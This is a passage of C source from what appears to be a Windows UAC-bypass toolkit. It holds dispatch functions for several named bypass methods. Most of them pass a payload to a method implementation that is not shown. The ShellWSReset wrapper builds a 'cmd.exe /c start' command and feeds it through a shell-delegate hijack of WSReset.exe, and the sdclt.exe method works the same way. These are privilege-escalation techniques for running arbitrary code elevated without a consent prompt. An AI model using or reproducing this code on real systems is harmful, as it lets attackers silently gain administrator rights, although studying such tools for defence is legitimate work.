    return ucmSPPLUAObjectMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodCreateNewLink)
{
    return ucmCreateNewLinkMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodDateTimeStateWriter)
{
#ifndef _WIN64 
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#else
    return ucmDateTimeStateWriterMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#endif
}

UCM_API(MethodAcCplAdmin)
{
    LPWSTR lpszPayload = NULL;
    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmAcCplAdminMethod(lpszPayload);
}

UCM_API(MethodDirectoryMock)
{
    return ucmDirectoryMockMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodShellSdctl)
{
    LPWSTR Payload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    if (g_ctx->OptionalParameterLength == 0)
        Payload = g_ctx->szDefaultPayload;
    else
        Payload = g_ctx->szOptionalParameter;

    return ucmShellDelegateExecuteCommandMethod(
        SDCLT_EXE,
        _strlen(SDCLT_EXE),
        T_CLASSESFOLDER,
        _strlen(T_CLASSESFOLDER),
        Payload,
        _strlen(Payload));
}

UCM_API(MethodEgre55)
{
#ifdef _WIN64 
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#else
    return ucmEgre55Method(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#endif
}

UCM_API(MethodTokenModUIAccess)
{
    return ucmTokenModUIAccessMethod(Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodShellWSReset)
{
    ULONG Result = 0;
    LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
    SIZE_T Size;

    UNREFERENCED_PARAMETER(Parameter);


    if (g_ctx->OptionalParameterLength == 0)
        PayloadParameter = g_ctx->szDefaultPayload;
    else
        PayloadParameter = g_ctx->szOptionalParameter;

    Size = ((MAX_PATH * 2) + _strlen(PayloadParameter)) * sizeof(WCHAR);
    PayloadFinal = supHeapAlloc(Size);
    if (PayloadFinal) {

        _strcpy(PayloadFinal, g_ctx->szSystemDirectory);
        _strcat(PayloadFinal, CMD_EXE);
        _strcat(PayloadFinal, TEXT(" /c start "));
        _strcat(PayloadFinal, PayloadParameter);

        Result = ucmShellDelegateExecuteCommandMethod(
            WSRESET_EXE,
            _strlen(WSRESET_EXE),
            T_APPXPACKAGE,
            _strlen(T_APPXPACKAGE),
            PayloadFinal,
            _strlen(PayloadFinal));

        supHeapFree(PayloadFinal);
    }

    return Result;
}
